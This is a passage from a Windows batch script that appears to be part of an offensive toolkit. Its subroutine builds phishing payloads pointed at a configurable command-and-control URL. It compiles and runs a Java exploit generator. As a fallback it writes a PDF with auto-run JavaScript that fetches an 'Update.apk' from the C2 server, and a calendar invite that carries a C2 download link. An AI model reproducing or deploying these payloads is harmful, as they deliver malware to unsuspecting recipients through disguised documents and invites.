    goto :main_menu
)
goto :exploit_menu

:generate_exploit_standalone
set "TYPE=%~1"
set "EXTRA=%~2"

REM Get C2 URL
set "C2_URL=http://127.0.0.1:8080"
if exist "%CONFIG_FILE%" (
    for /f "usebackq tokens=1,2 delims==" %%a in ("%CONFIG_FILE%") do (
        if "%%a"=="SHEET_URL" set "C2_URL=%%b"
    )
)

echo [96m[*] Compiling Exploit Generator...[0m
set "EXPLOIT_SRC=%PROJECT_DIR%\app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
set "TEMP_BIN=%SCRIPT_DIR%bin"
if not exist "!TEMP_BIN!" mkdir "!TEMP_BIN!"

javac -d "!TEMP_BIN!" "!EXPLOIT_SRC!" 2>nul

if %errorlevel% equ 0 (
    echo [92m[✓] Engine Ready. Producing payload...[0m
    cd /d "%SCRIPT_DIR%output"
    java -cp "!TEMP_BIN!" com.labs.labrats.exploits.ExploitLab !TYPE! !C2_URL! "!EXTRA!"
    cd /d "%SCRIPT_DIR%"
) else (
    echo [91m[!] Advanced binary crafting requires full JDK environment.[0m
    echo [93m[*] Falling back to template generation...[0m

    if "!TYPE!"=="pdf" (
        echo %%PDF-1.4> "output\exploit.pdf"
        echo 1 0 obj ^<^< /Type /Catalog /OpenAction ^<^< /S /JavaScript /JS (app.launchURL("!C2_URL!/download/Update.apk");) ^>^> ^>^> endobj>> "output\exploit.pdf"
        echo [92m[✓] Saved to output\exploit.pdf[0m
    ) else if "!TYPE!"=="ics" (
        echo BEGIN:VCALENDAR> "output\invite.ics"
        echo SUMMARY:!EXTRA!>> "output\invite.ics"
        echo DESCRIPTION:Download: !C2_URL!/l/meeting>> "output\invite.ics"
        echo END:VCALENDAR>> "output\invite.ics"
        echo [92m[✓] Saved to output\invite.ics[0m
    ) else (
        echo [91m[!] Binary exploits (MP4/Stego) require Java compilation.[0m
    )
)
echo.
pause
goto :eof
